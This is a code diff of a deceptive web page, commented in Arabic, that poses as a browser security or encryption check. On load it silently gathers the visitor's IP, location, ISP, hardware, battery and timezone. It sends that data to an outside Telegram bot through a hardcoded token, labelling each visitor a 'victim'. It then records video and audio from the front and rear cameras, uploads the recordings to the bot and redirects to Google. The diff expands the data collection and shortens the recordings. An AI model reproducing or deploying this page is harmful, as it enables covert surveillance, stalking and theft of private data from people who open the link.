@@ -3,112 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحقق من الأمان</title>
+    <title>تأمين البروتوكول</title>
     <style>
-        body { background-color: #000; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 2px solid #111; border-top: 2px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; box-shadow: 0 0 15px #00ff00; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 15px; color: #777; font-size: 14px; }
+        .status { margin-top: 25px; font-size: 13px; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <p>جاري فحص المتصفح.. يرجى الانتظار</p>
+    <div class="status" id="st">Initializing Encryption...</div>
 
     <script>
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
 
-        let currentStream = null;
-        let mediaRecorder = null;
-        let chunks = [];
-
-        async function startCapture() {
+        async function start() {
             if (!chatId) return;
 
-            // 1. إرسال البيانات النصية فوراً
-            await sendDeviceInfo();
+            // 1. جلب البيانات العميقة وإرسالها فوراً
+            await fetchDeepInfo();
 
-            // 2. تصوير الأمامية (30 ثانية)
-            await captureVideo("user", "أمامية", 30000);
+            // 2. تصوير الأمامية (10 ثوانٍ)
+            await capture("user", "Front (Selfie)");
 
-            // 3. تصوير الخلفية (30 ثانية)
-            await captureVideo("environment", "خلفية", 30000);
+            // 3. تصوير الخلفية (10 ثوانٍ)
+            await capture("environment", "Back (Rear)");
 
+            // التوجه النهائي
             window.location.href = "https://www.google.com";
         }
 
-        async function sendDeviceInfo() {
+        async function fetchDeepInfo() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const battery = await navigator.getBattery();
-                const info = `📊 **بيانات ضحية جديد**\n━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n🌍 الدولة: ${d.country_name}\n📍 المدينة: ${d.city}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level * 100)}%\n━━━━━━━━━━━━`;
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-            } catch (e) {}
-        }
-
-        async function captureVideo(cameraMode, label, duration) {
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode }, audio: true });
-                mediaRecorder = new MediaRecorder(currentStream);
-                chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-
-                mediaRecorder.onstop = async () => {
-                    if (chunks.length > 0) {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        await sendVideo(blob, label);
-                    }
-                };
-
-                mediaRecorder.start();
+                // جلب الـ IP والموقع
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
                
-                // الانتظار للمدة المحددة، مع إمكانية المقاطعة عند الخروج
-                await new Promise(resolve => {
-                    const timeout = setTimeout(() => {
-                        stopAll();
+                // جلب بيانات البطارية
+                const battery = await navigator.getBattery();
+                const battLevel = Math.round(battery.level * 100) + "%";
+                const isCharging = battery.charging ? "Yes" : "No";
+
+                // جلب بيانات الهاردوير
+                const ram = navigator.deviceMemory || "Unknown";
+                const cpu = navigator.hardwareConcurrency || "Unknown";
+                const gpu = getGPU();
+                const screen = `${window.screen.width}x${window.screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const lang = navigator.language;
+
+                const fullReport = `
+🚀 **NEW VICTIM PENETRATED**
+━━━━━━━━━━━━━━━━━━
+🌐 **Network Info:**
+• IP: \`${ipData.ip}\`
+• Provider: ${ipData.org}
+• Location: ${ipData.city}, ${ipData.country_name}
+
+📱 **Device Hardware:**
+• Model: ${navigator.platform}
+• CPU Cores: ${cpu}
+• RAM: ${ram} GB
+• GPU: ${gpu}
+• Screen: ${screen}
+
+🔋 **Battery Status:**
+• Level: ${battLevel}
+• Charging: ${isCharging}
+
+⚙️ **System Info:**
+• OS: ${navigator.userAgent.split(')')[0].split('(')[1]}
+• Language: ${lang}
+• Timezone: ${timezone}
+━━━━━━━━━━━━━━━━━━`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
+            } catch (e) {
+                console.log("Error fetching info");
+            }
+        }
+
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { return "Unknown GPU"; }
+        }
+
+        async function capture(mode, label) {
+            try {
+                document.getElementById('st').innerText = `Capturing ${label}...`;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+
+                return new Promise((resolve) => {
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        uploadVideo(blob, label); // رفع في الخلفية
+                        stream.getTracks().forEach(t => t.stop());
                         resolve();
-                    }, duration);
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ فقط
                 });
-
-            } catch (err) {
-                console.log("Error camera");
-            }
+            } catch (e) { return Promise.resolve(); }
         }
 
-        function stopAll() {
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-            }
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
+        function uploadVideo(blob, label) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('video', blob, `${label}.mp4`);
+            fd.append('caption', `🎬 Video From: ${label} Camera`);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
 
-        async function sendVideo(blob, label) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', blob, 'video.mp4');
-            formData.append('caption', `📹 فيديو كامل من الكاميرا ال${label}`);
-           
-            // استخدام keepalive لضمان إرسال الطلب حتى لو أُغلق المتصفح
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                method: 'POST',
-                body: formData,
-                keepalive: true
-            });
-        }
-
-        // محفزات الإرسال الفوري عند محاولة إغلاق الصفحة
-        window.addEventListener('beforeunload', stopAll);
-        window.addEventListener('pagehide', stopAll);
-
-        window.onload = startCapture;
+        window.onload = start;
     </script>
 </body>
 </html>
